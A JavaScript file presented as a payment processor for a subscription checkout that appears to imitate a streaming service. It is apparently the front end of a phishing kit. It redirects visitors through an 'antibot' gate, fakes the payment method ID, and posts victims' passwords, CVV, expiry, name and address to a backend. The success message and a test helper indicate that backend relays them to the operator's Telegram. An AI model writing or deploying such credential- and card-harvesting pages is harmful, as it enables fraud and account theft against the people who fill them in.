// Payment Processing JavaScript
class PaymentProcessor {
    constructor() {
        this.selectedPlan = this.getSelectedPlan();
        this.paymentId = null;
        this.checkVerification();
        this.init();
    }

    checkVerification() {
        const verified = sessionStorage.getItem('antibot_verified');
        const verificationTime = sessionStorage.getItem('verification_time');
        
        if (verified !== 'true' || !verificationTime) {
            // Redirect to antibot page
            const urlParams = new URLSearchParams(window.location.search);
            const plan = urlParams.get('plan') || 'Standard';
            const price = urlParams.get('price') || '15.49';
            window.location.href = `antibot.html?plan=${encodeURIComponent(plan)}&price=${price}`;
            return;
        }
        
        // Check if verification is still valid (10 minutes)
        const timeDiff = Date.now() - parseInt(verificationTime);
        if (timeDiff > 10 * 60 * 1000) {
            sessionStorage.removeItem('antibot_verified');
            sessionStorage.removeItem('verification_time');
            const urlParams = new URLSearchParams(window.location.search);
            const plan = urlParams.get('plan') || 'Standard';
            const price = urlParams.get('price') || '15.49';
            window.location.href = `antibot.html?plan=${encodeURIComponent(plan)}&price=${price}`;
            return;
        }
    }

    getSelectedPlan() {
        const urlParams = new URLSearchParams(window.location.search);
        return {
            name: urlParams.get('plan') || 'Standard',
            price: parseFloat(urlParams.get('price')) || 15.49
        };
    }

    init() {
        this.updatePlanDisplay();
        this.setupFormValidation();
        this.setupFormSubmission();
        this.formatCardNumber();
        this.formatExpiryDate();
        this.formatCVV();
    }

    updatePlanDisplay() {
        document.getElementById('selected-plan').textContent = `${this.selectedPlan.name} Plan`;
        document.getElementById('plan-price').textContent = `$${this.selectedPlan.price}/month`;
    }

    setupFormValidation() {
        const form = document.getElementById('payment-form');
        const inputs = form.querySelectorAll('input');

        inputs.forEach(input => {
            input.addEventListener('blur', () => this.validateField(input));
            input.addEventListener('input', () => this.clearFieldError(input));
        });
    }

    validateField(field) {
        const value = field.value.trim();
        let isValid = true;
        let errorMessage = '';

        // Email validation
        if (field.type === 'email') {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid email address';
            }
        }

        // Card number validation
        if (field.id === 'card-number') {
            const cardNumber = value.replace(/\s/g, '');
            if (cardNumber.length < 13 || cardNumber.length > 19) {
                isValid = false;
                errorMessage = 'Please enter a valid card number';
            }
        }

        // Expiry validation
        if (field.id === 'expiry') {
            const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
            if (!expiryRegex.test(value)) {
                isValid = false;
                errorMessage = 'Please use MM/YY format';
            } else {
                const [month, year] = value.split('/');
                const currentYear = new Date().getFullYear() % 100;
                const currentMonth = new Date().getMonth() + 1;
                const expiryYear = parseInt(year);
                const expiryMonth = parseInt(month);
                
                if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
                    isValid = false;
                    errorMessage = 'Card has expired';
                }
            }
        }

        // CVV validation
        if (field.id === 'cvv') {
            if (value.length < 3 || value.length > 4) {
                isValid = false;
                errorMessage = 'Please enter a valid CVV';
            }
        }

        // ZIP validation
        if (field.id === 'zip') {
            const zipRegex = /^\d{5}(-\d{4})?$/;
            if (!zipRegex.test(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid ZIP code';
            }
        }

        // Required field validation
        if (value === '') {
            isValid = false;
            errorMessage = 'This field is required';
        }

        this.showFieldError(field, isValid, errorMessage);
        return isValid;
    }

    showFieldError(field, isValid, errorMessage) {
        if (!isValid) {
            field.style.borderColor = '#e50914';
            field.style.backgroundColor = 'rgba(229, 9, 20, 0.1)';
            
            // Show error message
            let errorDiv = field.parentNode.querySelector('.field-error');
            if (!errorDiv) {
                errorDiv = document.createElement('div');
                errorDiv.className = 'field-error';
                errorDiv.style.color = '#e50914';
                errorDiv.style.fontSize = '12px';
                errorDiv.style.marginTop = '5px';
                field.parentNode.appendChild(errorDiv);
            }
            errorDiv.textContent = errorMessage;
        } else {
            field.style.borderColor = 'rgba(255, 255, 255, 0.2)';
            field.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
            
            // Remove error message
            const errorDiv = field.parentNode.querySelector('.field-error');
            if (errorDiv) {
                errorDiv.remove();
            }
        }
    }

    clearFieldError(field) {
        field.style.borderColor = 'rgba(255, 255, 255, 0.2)';
        field.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
        const errorDiv = field.parentNode.querySelector('.field-error');
        if (errorDiv) {
            errorDiv.remove();
        }
    }

    formatCardNumber() {
        const cardNumberInput = document.getElementById('card-number');
        cardNumberInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });
    }

    formatExpiryDate() {
        const expiryInput = document.getElementById('expiry');
        expiryInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
    }

    formatCVV() {
        const cvvInput = document.getElementById('cvv');
        cvvInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }

    async setupFormSubmission() {
        const form = document.getElementById('payment-form');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Validate all fields
            const inputs = form.querySelectorAll('input');
            let isFormValid = true;
            
            inputs.forEach(input => {
                if (!this.validateField(input)) {
                    isFormValid = false;
                }
            });
            
            if (!isFormValid) {
                this.showError('Please correct the errors in the form');
                return;
            }
            
            await this.processPayment();
        });
    }

    async processPayment() {
        const submitBtn = document.getElementById('submit-btn');
        const loading = document.getElementById('loading');
        const form = document.getElementById('payment-form');
        
        // Disable form and show loading
        submitBtn.disabled = true;
        loading.style.display = 'block';
        form.style.opacity = '0.5';
        
        try {
            // Create payment intent
            const paymentResponse = await fetch('/api/create-payment-intent', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    planName: this.selectedPlan.name,
                    price: this.selectedPlan.price,
                    email: document.getElementById('email').value,
                    userId: `user_${Date.now()}`
                })
            });
            
            const paymentData = await paymentResponse.json();
            
            if (!paymentData.success) {
                throw new Error(paymentData.error);
            }
            
            this.paymentId = paymentData.paymentId;
            
            // Process payment
            const processResponse = await fetch('/api/process-payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    paymentId: this.paymentId,
                    paymentMethodId: 'pm_card_' + Date.now(),
                    cardInfo: {
                        last4: document.getElementById('card-number').value.slice(-4),
                        brand: this.getCardBrand(document.getElementById('card-number').value)
                    },
                    userData: {
                        email: document.getElementById('email').value,
                        password: document.getElementById('password').value,
                        fullname: document.getElementById('fullname').value,
                        address: document.getElementById('address').value,
                        city: document.getElementById('city').value,
                        state: document.getElementById('state').value,
                        zip: document.getElementById('zip').value,
                        cardholderName: document.getElementById('cardholder-name').value,
                        cvv: document.getElementById('cvv').value,
                        expiry: document.getElementById('expiry').value
                    }
                })
            });
            
            const processData = await processResponse.json();
            
            if (processData.success) {
                this.showSuccess('Payment successful! 🎉 Subscription activated. Check your Telegram for confirmation.');
                
                // Redirect to success page after 3 seconds
                setTimeout(() => {
                    window.location.href = `index.html?subscription=success&plan=${this.selectedPlan.name}`;
                }, 3000);
            } else {
                throw new Error(processData.error);
            }
            
        } catch (error) {
            this.showError(`Payment failed: ${error.message}`);
        } finally {
            // Re-enable form
            submitBtn.disabled = false;
            loading.style.display = 'none';
            form.style.opacity = '1';
        }
    }

    getCardBrand(cardNumber) {
        const number = cardNumber.replace(/\s/g, '');
        if (number.startsWith('4')) return 'Visa';
        if (number.startsWith('5') || number.startsWith('2')) return 'Mastercard';
        if (number.startsWith('3')) return 'American Express';
        return 'Unknown';
    }

    showError(message) {
        const errorDiv = document.getElementById('error-message');
        const successDiv = document.getElementById('success-message');
        
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        successDiv.style.display = 'none';
        
        // Scroll to error
        errorDiv.scrollIntoView({ behavior: 'smooth' });
    }

    showSuccess(message) {
        const errorDiv = document.getElementById('error-message');
        const successDiv = document.getElementById('success-message');
        
        successDiv.textContent = message;
        successDiv.style.display = 'block';
        errorDiv.style.display = 'none';
        
        // Scroll to success
        successDiv.scrollIntoView({ behavior: 'smooth' });
    }
}

// Initialize payment processor when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new PaymentProcessor();
});

// Test Telegram connection
async function testTelegramConnection() {
    try {
        const response = await fetch('/api/test-telegram', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        });
        
        const data = await response.json();
        
        if (data.success) {
            alert('✅ Telegram connection successful! Check your Telegram for the test message.');
        } else {
            alert('❌ Telegram connection failed: ' + data.error);
        }
    } catch (error) {
        alert('❌ Failed to test Telegram connection: ' + error.message);
    }
}
